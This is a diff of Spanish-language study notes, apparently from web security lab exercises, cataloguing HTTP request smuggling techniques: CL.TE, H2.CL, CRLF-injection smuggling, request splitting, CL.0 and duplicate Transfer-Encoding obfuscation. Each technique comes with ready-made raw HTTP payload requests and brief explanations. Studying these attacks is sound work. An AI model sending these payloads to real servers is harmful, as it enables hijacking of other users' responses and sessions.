@@ -23,6 +23,7 @@
 ---
 # **Casos:**
 
+
 ## **CL.TE**
 **Request:**
 ```http
@@ -88,34 +89,149 @@ x=1
 **Request1:**
 ```http
 POST / HTTP/2
-Host: 0aeb00c904bfd8c8804085fa000e006a.web-security-academy.net
+Host: domain.com
 Transfer-Encoding: chunked
 Content-Length: 120
 
 0
 
 GET / HTTP/1.1
-Host: 0aeb00c904bfd8c8804085fa000e006a.web-security-academy.net
+Host: domain.com
 Content-Length: 12
 
 testing=test
-
 ```
 
 **Request2:**
 ```http
 POST / HTTP/2
-Host: 0aeb00c904bfd8c8804085fa000e006a.web-security-academy.net
+Host: domain.com
 Transfer-Encoding: chunked
 Content-Length: 88
 
 0
 
 GET / HTTP/1.1
-Host: 0aeb00c904bfd8c8804085fa000e006a.web-security-academy.net
+Host: domain.com
 
 ```
 
 **Explicacion:**
 - Aprovechando que el **back-end** sigue procesando peticiones **`HTTP/1.1`** embebidas dentro de solicitudes **`HTTP/2`**, enviamos varias peticiones preparadas con un GET /x camuflado. Gracias a este desfase, logramos obtener la respuesta de otra sesión.
 --- 
+## **H2.CL**
+**Request1:**
+```http
+POST / HTTP/2
+Host: domain.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+
+test=testing
+GET /error HTTP/1.1
+Host: domain.com
+Content-Length: 11
+
+test=test
+```
+
+**Request2:**
+```http
+POST / HTTP/2
+Host: domain.com
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: domain.com
+Content-Length: 5
+
+x=1
+```
+
+**Explicacion:**
+- El **Front-end** Acepta **`HTTP2`** y confía en el `Content-Length`, le envio un `POST` **`HTTP2`** con body exacto y un `GET` **`HTTP/1.1`** embebido. El gateway consume *N* bytes como body y deja el `GET` smuggleado, que al reusar la conexión el **back-end** procesa primero, desincronizando respuestas.
+-- -
+## **H2RS via CRLF Injection**
+![[Pasted image 20250819163452.png]]
+**Request1:**
+```http
+POST / HTTP/2
+Host: domain.com
+Transfer-Encoding: chunked
+Content-Length: 120
+
+0
+
+GET / HTTP/1.1
+Host: domain.com
+Content-Length: 12
+
+testing=test
+```
+
+**Request2:**
+```http
+POST / HTTP/2
+Host: domain.com
+Content-Length: 0
+
+0
+
+POST / HTTP/1.1
+Content-Length: 850
+Cookie: session=sgYzrktq4DXbbDs5qTRzKqzkxgurqKek
+
+search=test
+```
+
+**Explicacion:**
+Llevamos a cabo un ataque de **HTTP/2 Request Smuggling** aprovechando una mala sanitización de cabeceras por parte del *front-end*. Usamos un vector exclusivo de **HTTP/2** basado en **inyección CRLF** dentro del valor de una cabecera, lo que nos permite introducir una cabecera `Transfer-Encoding: chunked` maliciosa y un cuerpo que termina en `0`.
+- --
+## **H2RS via Splitting CRLF Injection**
+![[Pasted image 20250819170002.png]]
+**Request:**
+```http
+GET / HTTP/2
+Host: domain.com
+```
+
+**Explicacion:**
+- Explotamos una vulnerabilidad de **request splitting** específica de **HTTP/2**, en la que el servidor no limpia correctamente los **caracteres de control** inyectados en las cabeceras. Inyectamos una secuencia **CRLF** en el valor de una cabecera para **fragmentar la petición HTTP**, *smugglear* una nueva solicitud y **envenenar la cola de respuestas**.
+-- -
+## **Smuggling con CL.0**
+**Request:**
+```http
+POST /resources/images/blob.svg HTTP/1.1
+Host: 0a7b004c04cb921181412f72001900ef.web-security-academy.net
+Content-Length: 30
+
+
+GET /error HTTP/1.1
+Test: A
+```
+*Aclaracion:*
+- Probar con la cabecer **`Host`** antes de la cabecera Test.
+**Explicacion:**
+Realizamos un ataque de **request smuggling tipo CL.0**, donde el servidor *back-end* ignora el encabezado `Content-Length` en ciertas rutas, permitiendo **inyectar una segunda petición** dentro del cuerpo de una `POST` aparentemente legítima.
+-- -
+## **Smuggling ocultando el header TE**
+**Request1**
+```http
+POST / HTTP/1.1
+Host: domain.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: invalid
+
+38
+POST /error HTTP/1.1
+Content-Length: 30 
+
+testing=test 
+0
+
+```
+
+**Explicacion**
+- Se busca lograr una inconsistencia, a veces el **back-end** al ver que hay 2 encabezados igual con valores distintos, decide ignorar los 2 e interpretar por **`Content-Length`**
+-- -
